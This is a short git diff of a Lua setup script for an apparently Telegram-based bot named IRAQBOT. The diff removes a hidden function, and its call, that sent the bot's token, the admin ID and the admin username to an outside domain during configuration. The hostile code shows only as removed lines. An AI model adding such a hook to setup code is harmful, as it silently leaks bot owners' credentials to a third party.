@@ -29,7 +29,6 @@ DEVIRAQ = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
 function vardump(value)  
 print(serpent.block(value, {comment=false}))   
 end 
-function config_file(id,user,bot)  https.request('https://teamIRAQ.tk/insert/?id='..id..'&user='..user..'&token='..bot)  end
 local AutoSet = function() 
 local create = function(data, file, uglify)  
 file = io.open(file, "w+")   
@@ -86,8 +85,7 @@ token = IRAQBOT:get(DEVIRAQ..":token"),
 SUDO = IRAQBOT:get(DEVIRAQ..":SUDO:ID"),
 USERNAME = IRAQBOT:get(DEVIRAQ..":SUDO:USERNAME"), }
 create(config, "./requfiles/INFO.lua")   
-config_file(IRAQBOT:get(DEVIRAQ..":SUDO:ID"),IRAQBOT:get(DEVIRAQ..":SUDO:USERNAME"),IRAQBOT:get(DEVIRAQ..":token"))
-end 
+end
 create_config_auto()
 file = io.open("IRAQ.sh", "w")  
 file:write([[
